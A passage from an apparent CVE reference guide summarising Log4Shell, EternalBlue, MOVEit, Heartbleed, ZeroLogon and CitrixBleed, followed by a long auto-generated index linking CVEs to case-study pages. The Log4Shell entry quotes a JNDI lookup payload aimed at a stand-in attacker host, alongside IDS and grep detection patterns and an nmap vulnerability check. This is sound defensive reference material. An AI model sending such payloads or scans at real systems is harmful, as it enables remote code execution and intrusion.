CWE: CWE-502 (Deserialization) / CWE-917 (Expression Language Injection)
Disclosed: December 9, 2021 | Exploited: Within hours

Root cause: Log4j processed JNDI expressions (e.g., `${jndi:ldap://attacker.com/a}`)
embedded in any logged string (HTTP User-Agent, username, API parameters).
The JNDI lookup fetched and executed an attacker-controlled Java class.

Detection:

    # Suricata IDS rule
    alert http any any -> any any (msg:"Log4Shell"; content:"${jndi:"; nocase; sid:2034647;)

    # Find vulnerable JARs on disk
    find / -name "log4j-core-*.jar" 2>/dev/null

    # Scan for active exploitation attempts in logs
    grep -ri '${jndi:' /var/log/

Patch path: 2.15.0 (partial) -> 2.16.0 (JNDI disabled by default, CVE-2021-45046 fixed) ->
2.17.0 (CVE-2021-45105 DoS fixed) -> 2.17.1 (CVE-2021-44832 config-file RCE fixed)

Scale: Hundreds of millions of affected systems; exploited within hours by
nation-state APTs (Hafnium, APT41), ransomware groups, and cryptominers.

---

### CVE-2017-0144: EternalBlue (MS17-010)

<!-- hub-links:start (written by scripts/build_hub_links.py from data/hub/tag_counts.json; do not edit) -->

On the Intelligence Hub: [CVE-2017-0144 brief](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-0144)

<!-- hub-links:end -->

Affected: Windows XP through Server 2016 (SMBv1)
CVSS v2: 8.1 HIGH (practical severity ~10.0; wormable)
CWE: CWE-119 (Improper Memory Restriction)
Origin: NSA ETERNALBLUE leaked by Shadow Brokers, April 14, 2017
Patched: March 14, 2017 (MS17-010), one month before leak

Root cause: Buffer overflow in Windows SMBv1 server (srv.sys) transaction
handling. Unauthenticated SYSTEM-level RCE via TCP/445. Wormable.

Aftermath:
- WannaCry (May 2017): 200,000+ systems, 150 countries, $4-8B damage, NHS offline
- NotPetya (June 2017): $10B+ damage, Maersk/Merck/FedEx devastated; GRU Sandworm

Commands:

    nmap -p 445 --script smb-vuln-ms17-010 <target>

    # Disable SMBv1
    Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force

---

### CVE-2023-34362: MOVEit Transfer SQL Injection

<!-- hub-links:start (written by scripts/build_hub_links.py from data/hub/tag_counts.json; do not edit) -->

On the Intelligence Hub: [CVE-2023-34362 brief](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-34362)

<!-- hub-links:end -->

Affected: Progress MOVEit Transfer (all versions, pre-June 2023 patches)
CVSS: 9.8 CRITICAL | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
CWE: CWE-89 (SQL Injection)
Exploited by: Cl0p (TA505) ransomware group, May-June 2023 as 0-day

Technical: SQL injection via HTTP POST to /human.aspx. Cl0p deployed
LEMURLOOT webshell, exfiltrated all stored files. No authentication required.

Impact: 2,500+ organizations, including US DOE/USDA, PBI Research (900,000 SSA records),
Zellis UK payroll (BBC/BA/Boots), universities, government agencies.

Lesson: Silent 0-day exploitation for ~4 weeks before vendor awareness.
Pure data-theft extortion model (no encryption). Supply chain via file transfer infrastructure.

---

### CVE-2014-0160: Heartbleed

<!-- hub-links:start (written by scripts/build_hub_links.py from data/hub/tag_counts.json; do not edit) -->

On the Intelligence Hub: [CVE-2014-0160 brief](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2014-0160)

<!-- hub-links:end -->

Affected: OpenSSL 1.0.1 through 1.0.1f, 1.0.2-beta
CVSS v2: 5.0 MEDIUM (severely understated impact)
CWE: CWE-125 (Out-of-bounds Read)
Disclosed: April 7, 2014 | Exposure window: 2 years (since OpenSSL 1.0.1, March 2012)

Technical: TLS heartbeat extension (RFC 6520) allowed arbitrary memory reads
of up to 64KB per request by specifying a payload length larger than the actual
payload. No authentication, no log trace.

Exposed: Server private TLS keys (enables passive decryption of all traffic),
session tokens, cleartext passwords of active users.

Scale: ~17-25% of global HTTPS servers affected; required emergency mass
certificate revocation and reissuance.

---

### CVE-2020-1472: ZeroLogon

<!-- hub-links:start (written by scripts/build_hub_links.py from data/hub/tag_counts.json; do not edit) -->

On the Intelligence Hub: [CVE-2020-1472 brief](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-1472)

<!-- hub-links:end -->

Affected: Windows Server (Netlogon / MS-NRPC)
CVSS: 10.0 CRITICAL | AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
CWE: CWE-330 (Use of Insufficiently Random Values)
Discovered: Tom Tervoort, Secura, August 2020

Technical: Netlogon AES-CFB8 session key establishment with all-zero IV.
AES-CFB8 with zero IV has 1/256 probability of producing all-zero ciphertext
from zero plaintext. ~256 attempts achieve authentication as any machine account
(including domain controller) without knowing credentials. Full domain admin in ~3 seconds.

Patch timeline: Phase 1 (Aug 2020): optional enforcement; Phase 2 (Feb 2021):
mandatory. Microsoft delayed 6 months for legacy device compatibility.

---

### CVE-2023-4966: CitrixBleed

<!-- hub-links:start (written by scripts/build_hub_links.py from data/hub/tag_counts.json; do not edit) -->

On the Intelligence Hub: [CVE-2023-4966 brief](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-4966)

<!-- hub-links:end -->

Affected: Citrix NetScaler ADC and Gateway
CVSS: 9.4 CRITICAL | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
CWE: CWE-125 (Out-of-bounds Read)
Exploited: 0-day before patch; mass exploitation November 2023

Technical: Buffer over-read in NetScaler HTTP header processing leaked valid
session tokens from memory. Unauthenticated attackers bypassed authentication
AND MFA by replaying stolen tokens. No interception of traffic required.

Notable: LockBit 3.0 affiliate exploited CitrixBleed in Boeing breach (Nov 2023,
~45GB exfiltrated). Thousands of appliances remained unpatched weeks after the
Oct 10, 2023 patch release due to slow enterprise edge infrastructure patching.

<!-- hub-links:start (written by scripts/build_hub_links.py from data/hub/tag_counts.json; do not edit) -->

CVEs the library discusses that the Hub also tracks, each with its brief on the Hub and the pages here that name it:

| CVE | Named in |
|---|---|
| [CVE-2002-0367](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2002-0367) | [The Year 2002 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2002.md), [Slide plan: The Year 2002 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2002.md) |
| [CVE-2006-1547](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2006-1547) | [The Year 2006 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2006.md) |
| [CVE-2006-2492](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2006-2492) | [The Year 2006 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2006.md) |
| [CVE-2007-0671](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2007-0671) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2007 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2007.md), [Slide plan: The Year 2007 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2007.md) |
| [CVE-2007-1748](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2007-1748) | [The Year 2007 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2007.md) |
| [CVE-2007-3010](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2007-3010) | [The Year 2007 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2007.md) |
| [CVE-2007-5659](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2007-5659) | [The Year 2007 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2007.md) |
| [CVE-2008-0015](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2008-0015) | [The Year 2009 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2009.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Slide plan: The Year 2009 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2009.md), [Slide plan: The Year 2026 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2026.md) |
| [CVE-2008-4114](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2008-4114) | [The Year 2009 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2009.md) |
| [CVE-2008-4128](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2008-4128) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md), [Slide plan: The Year 2026 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2026.md), [Slide plan: Russia-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2008-4250](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2008-4250) | [ICS/OT Security Reference](/ICS_OT_SECURITY_REFERENCE.md), [The Year 2009 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2009.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Stuxnet: The Case Study](/case-studies/STUXNET.md), [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md), [Slide plan: The Year 2009 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2009.md), [Slide plan: The Year 2026 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2026.md), [Slide plan: Stuxnet: The Case Study](/case-studies/slides/plans/STUXNET.md) |
| [CVE-2008-4834](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2008-4834) | [The Year 2009 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2009.md) |
| [CVE-2008-4835](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2008-4835) | [The Year 2009 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2009.md) |
| [CVE-2009-0238](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2009-0238) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2009 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2009.md), [Slide plan: The Year 2009 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2009.md) |
| [CVE-2009-0556](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2009-0556) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2009 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2009.md), [Slide plan: The Year 2009 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2009.md) |
| [CVE-2009-0927](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2009-0927) | [The Year 2009 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2009.md) |
| [CVE-2009-1123](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2009-1123) | [The Year 2009 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2009.md) |
| [CVE-2009-1151](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2009-1151) | [The Year 2009 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2009.md), [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md), [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md) |
| [CVE-2009-1537](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2009-1537) | [The Year 2009 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2009.md), [Slide plan: The Year 2009 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2009.md) |
| [CVE-2009-1862](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2009-1862) | [The Year 2009 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2009.md), [Slide plan: The Year 2009 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2009.md) |
| [CVE-2009-2055](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2009-2055) | [The Year 2009 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2009.md) |
| [CVE-2009-3129](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2009-3129) | [The Year 2007 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2007.md) |
| [CVE-2009-3459](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2009-3459) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2009-3960](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2009-3960) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md) |
| [CVE-2009-4324](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2009-4324) | [The Year 2009 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2009.md), [Slide plan: The Year 2009 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2009.md) |
| [CVE-2010-0188](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2010-0188) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2010-0249](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2010-0249) | [The Year 2009 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2009.md), [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md), [Slide plan: The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/slides/plans/ZERO_DAY_MARKET_EVENTS.md) |
| [CVE-2010-2568](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2010-2568) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [ICS/OT Security Reference](/ICS_OT_SECURITY_REFERENCE.md), [Stuxnet: The Case Study](/case-studies/STUXNET.md), [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md), [United States-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_UNITED_STATES.md), [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md), [Slide plan: Stuxnet: The Case Study](/case-studies/slides/plans/STUXNET.md), [Slide plan: United States-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_UNITED_STATES.md) |
| [CVE-2010-2861](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2010-2861) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md) |
| [CVE-2010-2883](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2010-2883) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2010-3333](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2010-3333) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2007 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2007.md), [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md) |
| [CVE-2011-0609](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2011-0609) | [The FireEye Mandiant Intrusion of 2020: The Public Record](/case-studies/MANDIANT_INTRUSION_2020.md) |
| [CVE-2011-3402](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2011-3402) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [Stuxnet: The Case Study](/case-studies/STUXNET.md) |
| [CVE-2012-0158](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2012-0158) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [APT41: The Public Record, 2012 to 2026](/case-studies/APT41_PUBLIC_RECORD.md), [The Year 2007 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2007.md), [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md) |
| [CVE-2012-1723](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2012-1723) | [United States-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_UNITED_STATES.md) |
| [CVE-2012-1823](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2012-1823) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md) |
| [CVE-2012-1854](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2012-1854) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2012-1856](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2012-1856) | [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md) |
| [CVE-2012-4681](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2012-4681) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [United States-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_UNITED_STATES.md) |
| [CVE-2013-0422](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2013-0422) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2013-1331](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2013-1331) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2013-3900](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2013-3900) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2013-3906](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2013-3906) | [Sandworm: The Operations in the Public Record](/case-studies/SANDWORM_OPERATIONS.md), [Slide plan: Sandworm: The Operations in the Public Record](/case-studies/slides/plans/SANDWORM_OPERATIONS.md) |
| [CVE-2013-3918](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2013-3918) | [United States-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_UNITED_STATES.md) |
| [CVE-2014-0160](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2014-0160) | [CVE Reference Guide](/CVE_REFERENCE.md), [Network Protocols Reference: Security Perspective](/NETWORK_PROTOCOLS_REFERENCE.md), [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md) |
| [CVE-2014-1812](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2014-1812) | [The FireEye Mandiant Intrusion of 2020: The Public Record](/case-studies/MANDIANT_INTRUSION_2020.md) |
| [CVE-2014-4114](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2014-4114) | [Sandworm: The Operations in the Public Record](/case-studies/SANDWORM_OPERATIONS.md), [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md), [Slide plan: Sandworm: The Operations in the Public Record](/case-studies/slides/plans/SANDWORM_OPERATIONS.md) |
| [CVE-2014-4148](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2014-4148) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md), [United States-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_UNITED_STATES.md) |
| [CVE-2014-6271](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2014-6271) | [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md), [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md), [HackTheBox Machine Index](/research/HTB_MACHINE_INDEX.md) |
| [CVE-2014-6324](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2014-6324) | [Active Directory Attack Reference: Defender Edition](/ACTIVE_DIRECTORY_ATTACK_REFERENCE.md), [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md) |
| [CVE-2015-1641](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2015-1641) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [APT41: The Public Record, 2012 to 2026](/case-studies/APT41_PUBLIC_RECORD.md), [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md) |
| [CVE-2015-1671](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2015-1671) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2015-2360](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2015-2360) | [United States-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_UNITED_STATES.md), [Slide plan: United States-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_UNITED_STATES.md) |
| [CVE-2015-2387](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2015-2387) | [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md), [Slide plan: The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/slides/plans/ZERO_DAY_MARKET_EVENTS.md) |
| [CVE-2015-2426](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2015-2426) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2015-2545](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2015-2545) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2015-3306](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2015-3306) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/EXPOSURE_CHECKS_2026_11.md), [Magento and Adobe Commerce, CVE-2026-48356: Lab-Verified Exposure and Fix](/case-studies/MAGENTO_CVE_2026_48356.md), [PHP 8.4.27, CVE-2026-109618 and CVE-2026-109619: Two Fixes Verified in the Lab](/case-studies/PHP_8_4_27_CVES.md), [ProFTPD mod_copy, CVE-2015-3306: Unauthenticated File Copy in the Lab](/case-studies/PROFTPD_MOD_COPY_CVE_2015_3306.md), [Case Studies](/case-studies/README.md), [Slide plan: Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/slides/plans/EXPOSURE_CHECKS_2026_11.md), [Slide plan: ProFTPD mod_copy, CVE-2015-3306: Unauthenticated File Copy in the Lab](/case-studies/slides/plans/PROFTPD_MOD_COPY_CVE_2015_3306.md) |
| [CVE-2015-5119](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2015-5119) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md), [Slide plan: The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/slides/plans/ZERO_DAY_MARKET_EVENTS.md) |
| [CVE-2015-5122](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2015-5122) | [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md), [Slide plan: The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/slides/plans/ZERO_DAY_MARKET_EVENTS.md) |
| [CVE-2015-5123](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2015-5123) | [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md), [Slide plan: The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/slides/plans/ZERO_DAY_MARKET_EVENTS.md) |
| [CVE-2015-5477](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2015-5477) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/EXPOSURE_CHECKS_2026_11.md) |
| [CVE-2015-8651](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2015-8651) | [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md), [Slide plan: Other State-Linked Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_OTHER_STATES.md) |
| [CVE-2016-0034](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2016-0034) | [The Year 2016 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2016.md) |
| [CVE-2016-0167](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2016-0167) | [The FireEye Mandiant Intrusion of 2020: The Public Record](/case-studies/MANDIANT_INTRUSION_2020.md) |
| [CVE-2016-0189](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2016-0189) | [The Year 2016 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2016.md), [Slide plan: The Year 2016 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2016.md) |
| [CVE-2016-1019](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2016-1019) | [The Year 2016 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2016.md) |
| [CVE-2016-3081](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2016-3081) | [The Year 2016 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2016.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/EXPOSURE_CHECKS_2026_11.md) |
| [CVE-2016-3714](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2016-3714) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2016 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2016.md) |
| [CVE-2016-4117](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2016-4117) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2016 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2016.md) |
| [CVE-2016-4655](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2016-4655) | [The Year 2016 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2016.md), [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md), [Slide plan: The Year 2016 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2016.md) |
| [CVE-2016-4656](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2016-4656) | [The Year 2016 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2016.md), [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md) |
| [CVE-2016-4657](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2016-4657) | [The Year 2016 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2016.md), [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md) |
| [CVE-2016-5195](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2016-5195) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Privilege Escalation Reference](/PRIVESC_REFERENCE.md), [The Year 2016 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2016.md), [Slide plan: The Year 2016 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2016.md), [Container & Kubernetes Security](/disciplines/container-kubernetes-security.md) |
| [CVE-2016-6277](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2016-6277) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md), [The Year 2016 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2016.md), [Slide plan: The Year 2016 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2016.md) |
| [CVE-2016-6366](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2016-6366) | [The Year 2016 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2016.md), [The Shadow Brokers and Vault 7: The NSA and CIA Tool Leaks, 2016 to 2017](/case-studies/NSA_CIA_TOOL_LEAKS.md), [United States-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_UNITED_STATES.md), [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md), [Slide plan: The Year 2016 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2016.md), [Slide plan: The Shadow Brokers and Vault 7: The NSA and CIA Tool Leaks, 2016 to 2017](/case-studies/slides/plans/NSA_CIA_TOOL_LEAKS.md), [Slide plan: The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/slides/plans/ZERO_DAY_MARKET_EVENTS.md) |
